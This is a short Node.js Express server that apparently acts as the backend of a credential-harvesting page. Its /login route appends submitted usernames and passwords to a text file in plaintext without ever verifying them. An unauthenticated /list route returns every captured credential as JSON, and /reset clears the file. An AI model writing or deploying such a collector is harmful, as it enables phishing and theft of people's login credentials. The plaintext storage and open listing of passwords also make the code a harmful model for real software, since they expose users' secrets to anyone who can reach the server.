const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();

// Use body-parser to parse JSON bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Route to handle login data
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send("Username and password are required.");
  }

  const loginData = `Username: ${username}, Password: ${password}\n`;

  // Append the login data to a file
  fs.appendFile("logins.txt", loginData, (err) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Error saving login data.");
    }
    return res.status(200).json({
      message: "Login data saved successfully.",
    });
  });
});

app.get("/reset", (req, res) => {
  fs.writeFile("logins.txt", "", (err) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Error saving login data.");
    }
    return res.status(200).json({
      message: "Password reset successfully",
    });
  });
});

app.get("/list", (req, res) => {
  fs.readFile("logins.txt", "utf8", (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Error reading login data.");
    }

    // If file is empty, return an empty array
    if (!data.trim()) {
      return res.status(200).json([]);
    }

    // Split data by newlines and parse each row into a JSON object
    const records = data
      .trim()
      .split("\n")
      .map((line, index) => {
        const [usernamePart, passwordPart] = line.split(", ");
        const username = usernamePart.split("Username: ")[1];
        const password = passwordPart.split("Password: ")[1];

        return { id: index + 1, username, password };
      });

    res.status(200).json(records);
  });
});

app.get("/ping", (req, res) => {
  res.status(200).json({ message: "pong" });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
